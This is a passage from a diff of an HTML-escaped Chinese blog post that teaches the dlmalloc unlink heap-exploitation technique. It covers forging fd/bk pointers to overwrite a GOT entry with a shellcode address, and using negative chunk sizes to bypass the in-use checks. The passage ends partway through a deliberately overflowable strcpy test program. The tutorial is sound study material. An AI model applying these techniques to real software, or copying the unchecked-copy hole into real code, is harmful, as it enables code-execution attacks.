+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bk&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;其中，fd 和 bk 是可以被我们伪造的，而这就导致了：我们可以用 &lt;code&gt;unlink()&lt;/code&gt; 往自己想要的地址上写值&lt;/p&gt;
 &lt;p&gt;但有两个小问题是，1. 这个写是双向的；2. 这个写的操作会有一点点的偏移&lt;/p&gt;
 &lt;p&gt;例如，我们让 fd 指向 动态链接表上某个函数的地址，让 bk 指向 堆上的某段 shellcode，那么：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shllcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;funcs&lt;/span&gt; 
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可以看到，&lt;em&gt;func + 0xc&lt;/em&gt; 的位置被写了 shellcode，大了整整 0xc&lt;/p&gt;
-&lt;p&gt;以及，&lt;em&gt;shellcode + 0x8&lt;/em&gt; 的位置也被写了 func 的地址，这绝对会导致 shellcode 无法正常执行&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可以看到，&lt;em&gt;func + 0xc&lt;/em&gt; 的位置被写了 shellcode，偏移了整整 0xc&lt;/p&gt;
+&lt;p&gt;以及，&lt;em&gt;shellcode + 0x8&lt;/em&gt; 的位置也被写了 func 的地址，这绝对会导致 shellcode 到了这段时会无法正常执行&lt;/p&gt;
 &lt;p&gt;所以解决方法分别是&lt;/p&gt;
 &lt;ol&gt;
 &lt;li&gt;一开始就让想写入的地址减去 0xc&lt;/li&gt;
@@ -377,11 +379,13 @@
 如果需要执行非常长的一段 shellcode，那么可以写 &lt;code&gt;PUSH 真实地址 RET&lt;/code&gt;，这个只需要 6 bytes 就能完成&lt;/li&gt;
 &lt;/ol&gt;
 &lt;p&gt;所以稍微改写一下，我们就可以得到这个公式：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;令&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xc&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;令&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bk&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shllcode&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;那么&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;我们所想要的：&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shllcode&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;我们必须得纳入考虑并避免的：&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shllcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;func&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;令 &lt;span class=&#34;nv&#34;&gt;fd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; addr of func - 0xc
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;令 &lt;span class=&#34;nv&#34;&gt;bk&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; addr of shllcode
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;那么
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;我们所想要的：
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;fd + &lt;span class=&#34;nv&#34;&gt;0xc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; addr of shllcode
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;我们必须得纳入考虑并避免的：
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bk + &lt;span class=&#34;nv&#34;&gt;0x8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; addr of func
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
 &lt;h2 id=&#34;trick-use-negative-size&#34;&gt;Trick: use negative size&lt;/h2&gt;
 &lt;p&gt;前面提到，如果大小小于 80 的话会使用 fastbin，这样就没法使用漏洞了；&lt;/p&gt;
@@ -389,50 +393,68 @@
 &lt;p&gt;但如果输入方式（把数据写入 mem 的方式）不允许输入 NULL BYTE 的话，只能在这个 4 bytes 上写一个特别特别大的数值么？&lt;/p&gt;
 &lt;p&gt;确实是这样的，可以写一个特别大，以至于是负数的值：例如 &lt;code&gt;0xfffffffc&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;那么比如当他加上 0x80 的时候，&lt;/p&gt;
-&lt;p&gt;&lt;em&gt;0xfffffffc + 0x80&lt;/em&gt; = &lt;em&gt;0x10000007C&lt;/em&gt; = &lt;em&gt;0001|0000,0000,0000,0000|0000,0000,0111,1100|&lt;/em&gt;&lt;/p&gt;
-&lt;p&gt;而这是一台 32 位的机器，第33位的那个 1 会被舍去，也就变成了：&lt;em&gt;|0000,0000,0000,0000|0000,0000,0111,1100|&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;0xfffffffc + 0x80&lt;/em&gt; = &lt;em&gt;0x10000007C&lt;/em&gt; = &lt;br&gt;
+&lt;code&gt;0000,0000,0000,0001&lt;/code&gt;&lt;br&gt;
+&lt;code&gt;0000,0000,0000,0000&lt;/code&gt;&lt;br&gt;
+&lt;code&gt;0000,0000,0111,1100&lt;/code&gt;&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;而这是一台 32 位的机器，第33位的那个 1 会被舍去，也就变成了：&lt;br&gt;
+&lt;code&gt;0000,0000,0000,0000&lt;/code&gt;&lt;br&gt;
+&lt;code&gt;0000,0000,0000,0000&lt;/code&gt;&lt;br&gt;
+&lt;code&gt;0000,0000,0111,1100&lt;/code&gt;&lt;br&gt;&lt;/p&gt;
 &lt;p&gt;而这个值为 0x7c&lt;/p&gt;
 &lt;p&gt;所以当 0x80 加上 &lt;code&gt;0xfffffffc&lt;/code&gt; 时，实际的结果却相当于减去了 0x4，变成了 0x7c，相当于我们可以直接把它看作一个负数：-0x4&lt;/p&gt;
 &lt;p&gt;同样的，&lt;code&gt;0xfffffff8&lt;/code&gt; 也可以达到类似的效果，相当于 -0x8&lt;/p&gt;
 &lt;p&gt;这两个负数还有额外的 buff：由于他们的最低两个比特都是 0，所以就可以混过 &lt;code&gt;PREV_INUSE&lt;/code&gt; 和 &lt;code&gt;IS_MMAPPED&lt;/code&gt; 的检查&lt;/p&gt;
 &lt;p&gt;以及，当 malloc 计算临近的 chunk 时，使用的是 &lt;code&gt;nextchunk = p + size&lt;/code&gt;；&lt;code&gt;prevchunk = p - prev_size&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;那么假设这两个值都是 &lt;code&gt;0xfffffff8&lt;/code&gt; 就会：&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;nextchunk = p + size = p + -8 = p - 8&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;prevchunk = p - prev_size = p - -8 = p + 8&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;变成以下的效果：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/p/dlmalloc_unlink_vuln/nagative_size.png&#34;
+	width=&#34;1636&#34;
+	height=&#34;920&#34;
+	srcset=&#34;/p/dlmalloc_unlink_vuln/nagative_size_hubf4d37b5b49b46cd1ccc2d3735557c81_257141_480x0_resize_box_3.png 480w, /p/dlmalloc_unlink_vuln/nagative_size_hubf4d37b5b49b46cd1ccc2d3735557c81_257141_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;nagative_size.png&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;177&#34;
+		data-flex-basis=&#34;426px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;next-chunks-next-chunks-prev_inuse&#34;&gt;next chunk&amp;rsquo;s next chunk&amp;rsquo;s PREV_INUSE&lt;/h3&gt;
+&lt;p&gt;另外，还有一个需要提的：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;nextsize&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; chunksize&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;nextchunk&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;......
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;nextchunk&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; chunk_at_offset&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;p, size&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;nextinuse&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; inuse_bit_at_offset&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;nextchunk, nextsize&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;其中出现的宏 &lt;code&gt;chunksize(p)&lt;/code&gt;：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/* Get size, ignoring use bits */
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#define chunksize(p)         ((p)-&amp;gt;size &amp;amp; ~(SIZE_BITS))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果我们是向后 unlink，而且把相邻后一个 chunk 的 size 写上了一个负数 &lt;code&gt;0xfffffffc&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;则 &lt;code&gt;nextsize = ((nextchunk)-&amp;gt;size &amp;amp; ~(SIZE_BITS))&lt;/code&gt; 也是这个负数 &lt;code&gt;0xfffffffc&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;那么 &lt;code&gt;inuse_bit_at_offset(nextchunk, nextsize)&lt;/code&gt; 本来应该是 &lt;em&gt;下下个 chunk&lt;/em&gt; 的 size&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;/* check inuse bits in known places */&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#define inuse_bit_at_offset(p, s)\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;  (((mchunkptr)(((char*)(p)) + (s)))-&amp;gt;size &amp;amp; PREV_INUSE) 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;但现在却变成了&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;((nextchunk + nextsize) -&amp;gt; size) &amp;amp; PREV_INUSE&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;=&amp;gt; &lt;code&gt;((nextchunk - -0x4) -&amp;gt; size) &amp;amp; PREV_INUSE&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;=&amp;gt; &lt;code&gt;(nextchunk - 0x4 + 0x4) &amp;amp; PREV_INUSE&lt;/code&gt;&amp;hellip;.&lt;/p&gt;
+&lt;p&gt;竟然就是 &lt;code&gt;nextchunk &amp;amp; PREV_INUSE&lt;/code&gt;？！&lt;/p&gt;
+&lt;p&gt;这样就根本不用覆写 nextchunk 的 nextchunk 的 PREV_INUSE 了，好神奇啊&amp;hellip;&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2 id=&#34;proof-of-concept&#34;&gt;Proof of Concept&lt;/h2&gt;
-&lt;p&gt;写了一个很简单的程序，长这样：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;*/&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;aim&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;GOT modified&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;malloc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;128&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;malloc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;128&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;malloc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;128&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;strcpy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;strcpy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;strcpy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;ready to free&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;free&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;free c: nothing happend&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;free&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
